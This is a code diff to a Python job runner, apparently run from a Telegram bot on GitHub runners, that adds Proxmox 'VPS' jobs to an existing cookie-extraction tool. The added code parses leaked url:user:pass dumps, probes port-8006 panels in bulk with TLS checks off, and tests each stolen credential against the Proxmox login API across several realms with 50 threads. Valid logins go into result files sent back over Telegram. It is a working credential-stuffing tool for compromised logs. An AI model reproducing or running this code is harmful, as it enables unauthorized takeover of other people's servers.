@@ -1,5 +1,5 @@
 import glob, json, multiprocessing, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
-from concurrent.futures import ProcessPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 import requests
@@ -20,7 +20,7 @@ _flush = [0.0]
 
 RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
 THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'vps_probe': '🌐', 'vps_login': '🔐', 'vps_pack': '📤', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
 VM_TTL = 3600
 class _Ref:
     ref = 'rojaskomar67-ops/cookiebot-vm'
@@ -110,6 +110,20 @@ def stage_panel(p: dict) -> str:
         if stage == "wrong_password":
             lines.append(f"🔑 {code(p.get('tried', '?'))} {bold('rejected')}")
 
+    if stage in ("vps_probe", "vps_login", "vps_pack") and p.get("total") is not None:
+        if stage == "vps_probe":
+            lines.append(f"🔎 {bold('Panels')}  {code(p.get('total', 0))}")
+            lines.append(f"🌐 {bold('Reachable')} {code(p.get('ok', 0))}   "
+                         f"⛔ {bold('Not-PVE')} {code(p.get('invalid', 0))}   "
+                         f"💀 {bold('Dead')} {code(p.get('dead', 0))}")
+        else:
+            lines.append(f"🔑 {bold('Entries')} {code(p.get('total', 0))}")
+            lines.append(f"✅ {bold('Valid')} {code(p.get('valid', 0))}   "
+                         f"❌ {bold('Bad')} {code(p.get('bad', 0))}   "
+                         f"⚠️ {bold('Errors')} {code(p.get('errors', 0))}")
+        lines.append(f"⚡ {code(p.get('speed', '-'))}   ⏳ ETA {code(p.get('eta', '-'))}   "
+                     f"⏱ {code(p.get('elapsed', '-'))}")
+
     if stage in ("scan", "packed") and p.get("log_files") is not None:
         pd = p.get("per_domain") or {}
         det = "  ".join(f"{code(k)}={code(v)}" for k, v in pd.items()) or code("-")
@@ -146,8 +160,12 @@ def stage_panel(p: dict) -> str:
 
 def live_text(job) -> str:
     p = job.get("prog") or {}
+    vps_kind = (p.get("kind") or "").startswith("vps")
     wall = fmt_time(time.time() - job["t0"])
-    return (f"{gold_header('COOKIE EXTRACTION', 'GitHub CPU Runner · Live Console')}\n"
+    head = (gold_header('VPS PROXMOX', 'GitHub CPU Runner · Live Console')
+            if vps_kind else
+            gold_header('COOKIE EXTRACTION', 'GitHub CPU Runner · Live Console'))
+    return (f"{head}\n"
             f"{THIN}\n"
             f"{stage_panel(p)}\n"
             f"{THIN}\n"
@@ -1791,11 +1809,230 @@ def finish(task, stage, **extra):
                              "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
                              "tk_err", "tk_zip", "tk_proxies", "tk_link",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
-                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
+                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies",
+                             "total", "reach", "invalid", "unreach",
+                             "valid", "bad", "errors")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
 
+
+# ── VPS jobs (/vps_promox, /vps_check): same card, same download, CPU runner ──
+
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except Exception:
+    pass
+
+VPS_PANL = ":8006"
+VPS_LINE = re.compile(
+    r"(https?://[^\s:]+:\d{1,5}(?:/[^\s:]*)?):([^/:\s]{1,64}):(.{1,80})")
+VPS_TUNE   = 64          # reachability threads (all vCPUs)
+VPS_CHECKS = 50          # login-check threads
+VPS_RETRY  = 2           # extra attempts for network errors
+
+def vps_text(path):
+    """Whatever text may hold panel lines — zip archives are unpacked."""
+    data = open(path, "rb").read()
+    if data[:4] != b"PK\x03\x04":
+        return data.decode("utf-8", "ignore")
+    exd = WORK / "vpsun"
+    try:
+        shutil.rmtree(exd, ignore_errors=True)
+        exd.mkdir(parents=True)
+        with zipfile.ZipFile(path) as z:
+            z.extractall(exd)
+        parts = []
+        for root, _d, files in os.walk(str(exd)):
+            for fn in sorted(files):
+                p = os.path.join(root, fn)
+                try:
+                    parts.append(open(p, "rb").read().decode("utf-8", "ignore"))
+                except Exception:
+                    pass
+        return "\n".join(parts)
+    except Exception:
+        return data.decode("utf-8", "ignore")
+
+def vps_extract(text):
+    """ripgrep-style: one cheap substring reject per line, exact regex second,
+    deduped. Returns [(url, user, pass), ...] — never raises."""
+    seen, hits = set(), []
+    for line in text.splitlines():
+        if VPS_PANL not in line:
+            continue
+        m = VPS_LINE.search(line)
+        if not m:
+            continue
+        key = (m.group(1).strip(), m.group(2).strip(), m.group(3).strip())
+        if key in seen or not key[0] or not key[1]:
+            continue
+        seen.add(key)
+        hits.append(key)
+    return hits
+
+def vps_probe(entry):
+    """('ok'|'invalid'|'dead', note) — is the panel up and really Proxmox VE?"""
+    url, user, pwd = entry
+    try:
+        r = requests.get(url, timeout=8, verify=False, allow_redirects=True,
+                         headers={"User-Agent": "Mozilla/5.0 (Proxmox checker)"})
+    except Exception as e:
+        return "dead", type(e).__name__
+    if r.status_code >= 500:
+        return "dead", "HTTP %s" % r.status_code
+    html = (r.text or "")[:20000].lower()
+    is_pve = ("proxmox" in html
+              or ("pve" in html and ("extjs" in html or "pve2" in html or "/pve" in html)))
+    return ("ok", "HTTP %s" % r.status_code) if is_pve else ("invalid", "HTTP %s" % r.status_code)
+
+def vps_login(entry):
+    """('valid'|'bad'|'error', note) — the same POST the web GUI itself makes."""
+    url, user, pwd = entry
+    base = url.rstrip("/") + "/api2/json/access/ticket"
+    note = "no attempt"
+    for attempt in range(1 + VPS_RETRY):
+        saw_401 = False
+        for uname in ("%s@pam" % user, "%s@pve" % user, user):
+            try:
+                r = requests.post(base, timeout=12, verify=False,
+                                  data={"username": uname, "password": pwd},
+                                  headers={"User-Agent": "Mozilla/5.0 (Proxmox checker)"})
+            except Exception as e:
+                note = "%s: %s" % (type(e).__name__, str(e)[:60])
+                break                              # network down for every realm
+            if r.status_code == 200:
+                try:
+                    d = r.json().get("data") or {}
+                except Exception:
+                    d = {}
+                if d.get("ticket"):
+                    return "valid", uname
+                note = "200 without ticket"
+                continue
+            if r.status_code == 401:
+                saw_401 = True                      # panel alive, these creds rejected
+                continue
+            note = "HTTP %s" % r.status_code
+        else:
+            return ("bad", "authentication failure") if saw_401 else ("error", note)
+        if attempt < VPS_RETRY:
+            time.sleep(1)                           # retry: fresh attempt after 1s
+    return "error", note
+
+def tg_pull(fid, path):
+    """Download a Telegram document with the injected BOT_TOKEN."""
+    r = requests.get(TG_API + "getFile", params={"file_id": fid}, timeout=30)
+    p = ((r.json() or {}).get("result") or {}).get("file_path")
+    if not p:
+        raise RuntimeError("tg getFile failed: %s" % (r.text or "")[:110])
+    with open(path, "wb") as fh:
+        fh.write(requests.get(TG_API + "file/bot%s/%s" % (TG, p), timeout=300).content)
+    return path
+
+def _vps_pct(done, total, base=2, span=96):
+    return base + (done * span // total if total else 0)
+
+def process_vps(task):
+    """/vps_promox and /vps_check on this runner — one clean VM per job."""
+    global CHAT
+    kind = task.get("kind")
+    CHAT = task.get("chat")
+    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
+    PB[1] = task.get("msg")
+    (OUT / "cancel.flag").unlink(missing_ok=True)
+    st("queued", 0, job=task.get("job"), vm=SPECS)
+    t0 = time.time()
+
+    if kind == "vps_promox":
+        if task.get("url"):
+            arc = download(task["url"])            # /extract's own downloader
+            if arc is None:
+                finish(task, "error", err=_state.get("err") or "download failed")
+                return
+            path = str(arc)
+        elif task.get("file_id"):
+            path = tg_pull(task["file_id"], str(WORK / "vps_src.dat"))
+        else:
+            finish(task, "error", err="no source — send an ulp link or a file"); return
+        st("scan", 96, msg="filtering the :8006 panel lines…")
+        hits = vps_extract(vps_text(path))
+        if not hits:
+            finish(task, "error", err="no :8006 url:user:pass panel lines in the source")
+            return
+        st("vps_probe", 2, total=len(hits), ok=0, invalid=0, dead=0)
+        ok, inval, dead = [], [], []
+        done = [0]
+        def _probe(e):
+            res = vps_probe(e)
+            done[0] += 1
+            (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((e, res[1]))
+            tick("vps_probe", _vps_pct(done[0], len(hits)),
+                 total=len(hits), ok=len(ok), invalid=len(inval), dead=len(dead),
+                 threads=VPS_TUNE,
+                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
+                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(hits) - done[0])),
+                 elapsed=ft(time.time() - t0))
+        with ThreadPoolExecutor(max_workers=VPS_TUNE) as ex:
+            list(ex.map(_probe, hits))
+        if stop():
+            finish(task, "cancelled"); return
+        rf = OUT / "vps_promox_results.txt"
+        rf.write_text("=== REACHABLE PROXMOX PANELS ===\n" +
+                      "".join("%s:%s:%s\n" % e for (e, _n) in ok))
+        st("vps_pack", 99, total=len(hits), ok=len(ok))
+        sent = upload(str(rf),
+                      "VPS PROMOX — reachable %s/%s panels" % (len(ok), len(hits)))
+        finish(task, "done", total=len(hits), reach=len(ok),
+               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0)
+        return
+
+    if kind == "vps_check":
+        if not task.get("file_id"):
+            finish(task, "error", err="no results file — reply to one with /vps_check")
+            return
+        path = tg_pull(task["file_id"], str(WORK / "vps_check_src.dat"))
+        entries = vps_extract(vps_text(path))
+        if not entries:
+            finish(task, "error", err="no :8006 url:user:pass lines in that file")
+            return
+        st("vps_login", 2, total=len(entries), valid=0, bad=0, errors=0)
+        valid, bad, err = [], [], []
+        done = [0]
+        def _check(e):
+            res = vps_login(e)
+            done[0] += 1
+            (valid if res[0] == "valid" else bad if res[0] == "bad" else err).append((e, res[1]))
+            tick("vps_login", _vps_pct(done[0], len(entries)),
+                 total=len(entries), valid=len(valid), bad=len(bad), errors=len(err),
+                 threads=VPS_CHECKS,
+                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
+                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(entries) - done[0])),
+                 elapsed=ft(time.time() - t0))
+        with ThreadPoolExecutor(max_workers=VPS_CHECKS) as ex:
+            list(ex.map(_check, entries))
+        if stop():
+            finish(task, "cancelled"); return
+        rp = OUT / "vps_check_results.txt"
+        rp.write_text(
+            "=== VPS PROXMOX CHECK — SUMMARY ===\n"
+            "Entries : %d\nValid   : %d\nBad     : %d\nErrors  : %d\n"
+            "Date    : %s\n\n=== VALID OK ===\n%s\n=== BAD ===\n%s\n=== ERROR ===\n%s\n" % (
+                len(entries), len(valid), len(bad), len(err),
+                time.strftime("%Y-%m-%d %H:%M:%S"),
+                "".join("%s:%s:%s\n" % e for (e, _n) in valid),
+                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n) in bad),
+                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n) in err)))
+        st("vps_pack", 99, total=len(entries), valid=len(valid))
+        sent = upload(str(rp),
+                      "VPS CHECK — valid %s / bad %s / errors %s"
+                      % (len(valid), len(bad), len(err)))
+        finish(task, "done", total=len(entries), valid=len(valid),
+               bad=len(bad), errors=len(err), sent=1 if sent else 0)
+        return
+
+    finish(task, "error", err="unknown vps kind %r" % kind)
 
 def process(task):
     """Run one job inside this long-lived VM."""
@@ -2011,6 +2248,9 @@ def main():
         task = json.loads(os.environ.get("TASK") or "{}")
     except Exception:
         task = {}
+    if task.get("kind") in ("vps_promox", "vps_check"):
+        process_vps(task)
+        return
     if not task.get("url"):
         st("error", err="runner started without a task")
         report({"event": "no_task"})
